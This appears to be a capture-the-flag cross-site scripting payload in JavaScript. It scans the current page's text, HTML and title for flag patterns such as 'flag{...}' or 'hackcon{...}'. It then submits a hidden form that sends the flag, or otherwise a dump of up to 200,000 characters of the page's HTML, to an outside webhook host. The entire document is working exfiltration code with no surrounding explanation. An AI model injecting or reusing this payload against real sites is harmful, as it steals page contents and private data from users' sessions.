(() => {
  const WEBHOOK = 'https://webhooksite.net/ae3222ba-a10c-4885-942d-a1e673df5116';

  const pats = [
    /flag\{[^}]+\}/i,
    /ctf\{[^}]+\}/i,
    /hackcon[a-z_]*\{[^}]+\}/i,
    /hc[a-z_]*\{[^}]+\}/i
  ];

  const findFlag = (text) => {
    if (!text) return null;
    for (const re of pats) {
      const m = text.match(re);
      if (m) return m[0];
    }
    return null;
  };

  const send = (obj) => {
    const f = document.createElement('form');
    f.method = 'POST';
    f.action = WEBHOOK;

    for (const [k, v] of Object.entries(obj)) {
      const t = document.createElement('textarea');
      t.name = k;
      t.value = String(v || '');
      f.appendChild(t);
    }

    document.body.appendChild(f);
    f.submit();
  };

  const title = document.title || '';
  const href = location.href || '';
  const body = document.body ? document.body.innerText : '';
  const html = document.documentElement ? document.documentElement.outerHTML : '';

  const hit =
    findFlag(body) ||
    findFlag(html) ||
    findFlag(title);

  if (hit) {
    send({
      type: 'flag',
      href,
      title,
      flag: hit
    });
    return;
  }

  send({
    type: 'dump',
    href,
    title,
    body: body.slice(0, 20000),
    html: html.slice(0, 200000)
  });
})();
